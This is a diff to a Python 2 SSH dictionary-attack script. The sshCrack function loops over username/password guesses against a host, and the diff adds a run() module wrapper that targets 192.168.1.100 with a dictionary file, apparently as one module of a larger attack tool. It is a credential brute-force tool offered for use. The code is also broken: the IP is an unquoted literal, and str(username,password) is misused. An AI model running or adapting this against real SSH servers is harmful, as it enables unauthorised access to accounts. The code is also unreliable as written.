@@ -23,8 +23,14 @@ def sshCrack(ipAddress, dictionaryFile) :
 			print "[-] Failed! ..."
 			continue
 
-		print "[+] Success ... username: %s and passoword %s is VALID! " % (username, password)
-		break
+		print "[+] Success ... username: %s and password %s is VALID! " % (username, password)
+		return str(username,password)
+
+def run(**args):
+    print "[*] In ssh module."
+    files = sshCrack(192.168.1.100,"../config/dictionary")
+
+    return str(files)
 
 
 
